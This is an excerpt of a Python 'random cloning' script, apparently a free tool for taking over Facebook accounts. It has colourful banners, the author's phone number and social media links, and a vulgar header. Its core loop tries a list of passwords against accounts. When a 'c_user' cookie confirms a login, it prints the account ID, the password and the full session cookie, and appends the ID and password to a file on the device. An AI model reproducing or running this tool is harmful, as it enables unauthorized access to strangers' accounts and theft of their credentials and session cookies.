#JIBON 😍🌺 fuck Kids
#Dek by Mr JIBON 😍🌺 
#pola pain je ablami korbi te mara khabi
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
...
logo=("""\033[1;37m
 ...
 \033[1;92m ╚╝──╚═══╩═══╩╝╚═╩═══╩╝╚═╝    
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V15 \033[0;m    ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
\33[1;92m ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\33[1;92m ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mJIBON AHMED JITU           ┃
 \33[1;92m┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
 \33[1;92m┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
 \33[1;92m┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
 \33[1;92m┃ [✓] GITHUB    \033[1;91m: \033[1;92mJIBON AHMED                ┃
 \33[1;92m┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mJIBON AHMED                ┃
 \33[1;92m┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+8801867341765             ┃
\33[1;92m ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def Main():
	...
	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] JOIN MESSENGER")
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/JIBON.AHMED007');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://m.me/JIBON.AHMED2007/');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	print(' [2] Sent Request FB ACCOUNT')
	print(' [3] Contract Messenger')
	print(' [0] Back to Main menu')
	bal = input('Choose option >>> ')
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801867341765');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/JIBON.AHMED65');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://m.me/JIBON.AHMED2007');time.sleep(1)
		admin()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [ JIBON 😍🌺-💚] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/JIBON.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
